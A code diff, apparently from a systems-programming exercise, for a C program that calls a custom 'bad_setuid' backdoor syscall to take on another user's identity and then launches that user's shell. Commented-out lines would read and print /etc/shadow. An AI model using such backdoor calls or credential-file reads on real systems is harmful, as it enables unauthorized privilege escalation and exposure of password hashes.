@@ -1,13 +1,10 @@
-#include <linux/unistd.h>
-#include <unistd.h>
-#include <sys/syscall.h>
+#include <stdio.h>
+#include <errno.h>
+#include <string.h>
 
 #include <pwd.h>
 
-#include <stdio.h>
-
-#include <errno.h>
-#include <string.h>
+#include <bad_setuid.h>
 
 int main(int argc, char** argv)
 {
@@ -31,21 +28,40 @@ int main(int argc, char** argv)
 
 	printf("Trying to change user to %s with UID %d!\n", username, new_uid);
 
-	const long result = syscall(__NR_bad_setuid, new_uid);
+	int result = bad_setuid(new_uid);
 
-	if (result >= 0) {
-		printf("Changed user!\n");	
+	if (result == 0) {
+		printf("Changed effective user! Effective UID is now: %d\n", geteuid());	
 	} else {
 
-		printf("Failed to change user!\n");
+		printf("Failed to change effective user!\n");
+		goto error;
+	}
+
+	errno = 0;
+	result = setreuid(new_uid, new_uid);
+
+	if (result == 0) {
+		printf("Changed real user! Real UID is now: %d\n", getuid());	
+	} else {
+
+		printf("Failed to change real user!\n");
 		errno = -result;
 		goto error;
 	}
 
-	char* args[] = { "sh" };
+	/* errno = 0; */
+	/* FILE* file = fopen("/etc/shadow", "r"); */
+	/* if (!file) goto error; */
+	/* char buffer[80]; */
+	/* int size_read = fread(&buffer, 79, 1, file); */ 
+	/* printf("%s\n", buffer); */
+
+	printf("Starting shell...\n");
+	char* args[] = { user_info->pw_shell, NULL };
 	execv(user_info->pw_shell, args);
 
-	return 0;
+	printf("Shell execution failed!");
 error:
 	printf("\tDue to: %s\n", strerror(errno));
 	return 1;
